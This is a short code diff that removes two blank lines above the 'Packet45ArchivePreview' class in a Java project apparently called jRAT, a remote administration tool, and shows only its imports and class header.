@@ -8,8 +8,6 @@ import pro.jrat.Slave;
 import pro.jrat.ui.frames.FramePreviewZip;
 import pro.jrat.utils.IconUtils;
 
-
-
 public class Packet45ArchivePreview extends AbstractIncomingPacket {
 
 	@Override
